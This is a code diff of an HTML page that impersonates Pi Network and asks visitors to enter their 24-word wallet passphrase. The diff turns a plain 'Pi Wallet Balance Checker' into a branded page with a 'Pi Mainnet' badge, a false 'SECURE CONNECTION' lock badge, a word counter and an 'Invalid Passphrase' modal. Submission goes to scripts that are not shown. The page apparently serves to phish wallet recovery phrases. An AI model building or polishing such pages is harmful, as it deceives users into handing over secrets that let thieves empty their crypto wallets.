@@ -3,39 +3,515 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Enter Passphrase</title>
+<title>Enter Passphrase - Pi Network</title>
 <link rel="stylesheet" href="css/style.css" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+  :root {
+    --pi-gold: #f6a01a;
+    --pi-gold-glow: rgba(246, 160, 26, 0.35);
+    --bg-dark: #0f041c;
+    --bg-card: rgba(30, 14, 52, 0.75);
+    --border-color: rgba(246, 160, 26, 0.25);
+    --text-main: #ffffff;
+    --text-muted: #a79cb8;
+  }
+
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: 'Plus Jakarta Sans', sans-serif;
+  }
+
+  body {
+    background: radial-gradient(circle at 50% 10%, #2c0b4d 0%, var(--bg-dark) 80%);
+    color: var(--text-main);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    padding: 40px 20px;
+  }
+
+  .dashboard-container {
+    max-width: 700px;
+    margin: 0 auto;
+    width: 100%;
+  }
+
+  /* Header Bar */
+  .top-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding-bottom: 25px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    margin-bottom: 35px;
+  }
+
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+
+  .pi-logo {
+    width: 52px;
+    height: 52px;
+    background: linear-gradient(135deg, #f6a01a, #d48200);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 800;
+    font-size: 28px;
+    color: #2b0846;
+    box-shadow: 0 0 18px var(--pi-gold-glow);
+  }
+
+  .brand-text h2 {
+    font-size: 22px;
+    font-weight: 800;
+    letter-spacing: 0.5px;
+  }
+
+  .badge-mainnet {
+    background: rgba(246, 160, 26, 0.15);
+    border: 1px solid var(--pi-gold);
+    color: var(--pi-gold);
+    font-size: 11px;
+    font-weight: 700;
+    padding: 3px 10px;
+    border-radius: 6px;
+    text-transform: uppercase;
+  }
+
+  .status-badge {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    color: var(--pi-gold);
+    font-weight: 700;
+    font-size: 13px;
+    letter-spacing: 1px;
+  }
+
+  .status-badge .lock-icon {
+    width: 28px;
+    height: 28px;
+    background: rgba(246, 160, 26, 0.2);
+    border: 1px solid var(--pi-gold);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+  }
+
+  /* Section Title */
+  .section-title {
+    text-align: center;
+    margin-bottom: 35px;
+  }
+
+  .section-title h1 {
+    font-size: 26px;
+    letter-spacing: 1px;
+    color: #ffffff;
+    font-weight: 800;
+    margin-bottom: 10px;
+  }
+
+  .section-title p {
+    color: var(--text-muted);
+    font-size: 15px;
+  }
+
+  /* Form Container */
+  .form-container {
+    background: var(--bg-card);
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    border: 1px solid var(--border-color);
+    border-radius: 20px;
+    padding: 35px 30px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+    margin-bottom: 25px;
+  }
+
+  .form-group {
+    margin-bottom: 25px;
+  }
+
+  label {
+    display: block;
+    font-size: 14px;
+    font-weight: 700;
+    color: #ffffff;
+    margin-bottom: 12px;
+    letter-spacing: 0.5px;
+  }
+
+  textarea {
+    width: 100%;
+    min-height: 160px;
+    padding: 18px;
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(255, 255, 255, 0.15);
+    border-radius: 14px;
+    color: #ffffff;
+    font-size: 15px;
+    font-family: 'Courier New', monospace;
+    line-height: 1.6;
+    resize: vertical;
+    transition: all 0.25s ease;
+  }
+
+  textarea:focus {
+    outline: none;
+    border-color: var(--pi-gold);
+    box-shadow: 0 0 20px rgba(246, 160, 26, 0.2);
+    background: rgba(255, 255, 255, 0.08);
+  }
+
+  textarea::placeholder {
+    color: #6b5e7a;
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-size: 14px;
+  }
+
+  /* Button Group */
+  .btn-group {
+    display: flex;
+    gap: 15px;
+    flex-wrap: wrap;
+  }
+
+  .btn-submit {
+    flex: 1;
+    min-width: 200px;
+    background: linear-gradient(135deg, var(--pi-gold), #e08b00);
+    color: #200538;
+    border: none;
+    padding: 16px 30px;
+    border-radius: 14px;
+    font-size: 16px;
+    font-weight: 800;
+    cursor: pointer;
+    transition: all 0.25s ease;
+    box-shadow: 0 6px 20px rgba(246, 160, 26, 0.35);
+  }
+
+  .btn-submit:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px rgba(246, 160, 26, 0.5);
+  }
+
+  .btn-submit:active {
+    transform: translateY(0);
+  }
+
+  .btn-submit:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+    transform: none;
+  }
+
+  .btn-secondary {
+    flex: 1;
+    min-width: 200px;
+    background: rgba(255, 255, 255, 0.08);
+    color: #ffffff;
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    padding: 16px 30px;
+    border-radius: 14px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.25s ease;
+  }
+
+  .btn-secondary:hover {
+    background: rgba(255, 255, 255, 0.15);
+    border-color: rgba(255, 255, 255, 0.3);
+    transform: translateY(-2px);
+  }
+
+  .btn-secondary:active {
+    transform: translateY(0);
+  }
+
+  /* Status Message */
+  .status {
+    margin-top: 20px;
+    padding: 15px 20px;
+    border-radius: 12px;
+    font-size: 14px;
+    font-weight: 600;
+    display: none;
+    text-align: center;
+  }
+
+  .status.loading {
+    display: block;
+    background: rgba(246, 160, 26, 0.1);
+    border: 1px solid rgba(246, 160, 26, 0.3);
+    color: var(--pi-gold);
+    animation: pulseStatus 1.5s infinite;
+  }
+
+  .status.error {
+    display: block;
+    background: rgba(239, 68, 68, 0.1);
+    border: 1px solid rgba(239, 68, 68, 0.3);
+    color: #fca5a5;
+  }
+
+  .status.ok {
+    display: block;
+    background: rgba(34, 197, 94, 0.1);
+    border: 1px solid rgba(34, 197, 94, 0.3);
+    color: #86efac;
+  }
+
+  @keyframes pulseStatus {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.7; }
+  }
+
+  /* Modal */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0, 0, 0, 0.8);
+    backdrop-filter: blur(8px);
+    -webkit-backdrop-filter: blur(8px);
+    z-index: 1000;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  .modal-box {
+    background: linear-gradient(135deg, #1a0b2e 0%, #0f041c 100%);
+    border: 1px solid rgba(239, 68, 68, 0.4);
+    border-radius: 20px;
+    padding: 35px 30px;
+    max-width: 450px;
+    width: 100%;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6), 0 0 30px rgba(239, 68, 68, 0.2);
+    text-align: center;
+  }
+
+  .modal-box .error-icon {
+    width: 60px;
+    height: 60px;
+    background: rgba(239, 68, 68, 0.15);
+    border: 2px solid #ef4444;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 28px;
+    margin: 0 auto 20px;
+  }
+
+  .modal-box h3 {
+    font-size: 22px;
+    font-weight: 800;
+    color: #ef4444;
+    margin-bottom: 15px;
+  }
+
+  .modal-box p {
+    color: #d6cfdd;
+    font-size: 14px;
+    line-height: 1.6;
+    margin-bottom: 25px;
+  }
+
+  .modal-actions {
+    display: flex;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+
+  .modal-actions button {
+    flex: 1;
+    min-width: 140px;
+    padding: 14px 20px;
+    border-radius: 12px;
+    font-size: 14px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.25s ease;
+  }
+
+  .btn-dismiss {
+    background: rgba(255, 255, 255, 0.08);
+    color: #ffffff;
+    border: 1px solid rgba(255, 255, 255, 0.2);
+  }
+
+  .btn-dismiss:hover {
+    background: rgba(255, 255, 255, 0.15);
+  }
+
+  .btn-find {
+    background: linear-gradient(135deg, var(--pi-gold), #e08b00);
+    color: #200538;
+    border: none;
+    box-shadow: 0 4px 15px rgba(246, 160, 26, 0.3);
+  }
+
+  .btn-find:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(246, 160, 26, 0.5);
+  }
+
+  /* Word Count Indicator */
+  .word-count {
+    text-align: right;
+    font-size: 12px;
+    color: var(--text-muted);
+    margin-top: 8px;
+  }
+
+  .word-count.correct {
+    color: #22c55e;
+  }
+
+  .word-count.incorrect {
+    color: #ef4444;
+  }
+
+  /* Responsive */
+  @media (max-width: 768px) {
+    .top-header { 
+      flex-direction: column; 
+      gap: 15px; 
+      text-align: center; 
+    }
+
+    .section-title h1 {
+      font-size: 22px;
+    }
+
+    .form-container {
+      padding: 25px 20px;
+    }
+
+    .btn-group {
+      flex-direction: column;
+    }
+
+    .btn-submit,
+    .btn-secondary {
+      min-width: 100%;
+    }
+
+    .modal-actions {
+      flex-direction: column;
+    }
+
+    .modal-actions button {
+      min-width: 100%;
+    }
+  }
+</style>
 </head>
 <body>
 
-<h1>Pi Wallet Balance Checker</h1>
-<p class="sub">Enter your 24‑word passphrase to check balance.</p>
+<div class="dashboard-container">
+  
+  <!-- Header Bar -->
+  <header class="top-header">
+    <div class="brand">
+      <div class="pi-logo">π</div>
+      <div class="brand-text">
+        <h2>Pi Network</h2>
+        <span class="badge-mainnet">Pi Mainnet</span>
+      </div>
+    </div>
+    <div class="status-badge">
+      <div class="lock-icon">🔒</div>
+      <span>SECURE CONNECTION</span>
+    </div>
+  </header>
 
-<div>
-  <label for="passphrase">Enter Your 24 Words Passphrase</label>
-  <textarea id="passphrase" placeholder="word1 word2 word3 ... word24"></textarea>
+  <!-- Title -->
+  <div class="section-title">
+    <h1>Enter Your Passphrase</h1>
+    <p>Enter your 24‑word passphrase to proceed your request</p>
+  </div>
+
+  <!-- Form Container -->
+  <div class="form-container">
+    <div class="form-group">
+      <label for="passphrase">Your 24 Words Passphrase</label>
+      <textarea id="passphrase" placeholder="word1 word2 word3 ... word24"></textarea>
+      <div class="word-count" id="wordCount">0 / 24 words</div>
+    </div>
+
+    <div class="btn-group">
+      <button id="submitBtn" class="btn-submit">✓ Submit</button>
+      <button id="findPassBtn" class="btn-secondary">🔍 Find your passphrase</button>
+    </div>
+
+    <div id="status" class="status"></div>
+  </div>
+
 </div>
-
-<div class="btn-group">
-  <button id="submitBtn">Submit</button>
-  <button id="findPassBtn" class="secondary">Find your passphrase</button>
-</div>
-
-<div id="status" class="status"></div>
 
 <!-- Modal for invalid passphrase -->
 <div id="invalidModal" class="modal-overlay">
   <div class="modal-box">
+    <div class="error-icon">⚠️</div>
     <h3>Invalid Passphrase</h3>
     <p>The passphrase you entered is not valid. Please check the words and try again, or use "Find your passphrase" to learn how to locate it.</p>
     <div class="modal-actions">
-      <button id="dismissModalBtn" class="secondary">Dismiss</button>
-      <button id="modalFindBtn">Find your passphrase</button>
+      <button id="dismissModalBtn" class="btn-dismiss">Dismiss</button>
+      <button id="modalFindBtn" class="btn-find">🔍 Find your passphrase</button>
     </div>
   </div>
 </div>
 
 <script src="js/config.js"></script>
 <script src="js/unlock.js"></script>
+
+<!-- Word Count Script -->
+<script>
+  // Word count indicator
+  document.addEventListener('DOMContentLoaded', function() {
+    const passphraseInput = document.getElementById('passphrase');
+    const wordCountElement = document.getElementById('wordCount');
+    
+    if (passphraseInput && wordCountElement) {
+      passphraseInput.addEventListener('input', function() {
+        const words = this.value.trim().split(/\s+/).filter(Boolean);
+        const count = words.length;
+        
+        wordCountElement.textContent = count + ' / 24 words';
+        
+        if (count === 24) {
+          wordCountElement.className = 'word-count correct';
+        } else if (count > 0 && count !== 24) {
+          wordCountElement.className = 'word-count incorrect';
+        } else {
+          wordCountElement.className = 'word-count';
+        }
+      });
+    }
+  });
+</script>
+
 </body>
 </html>
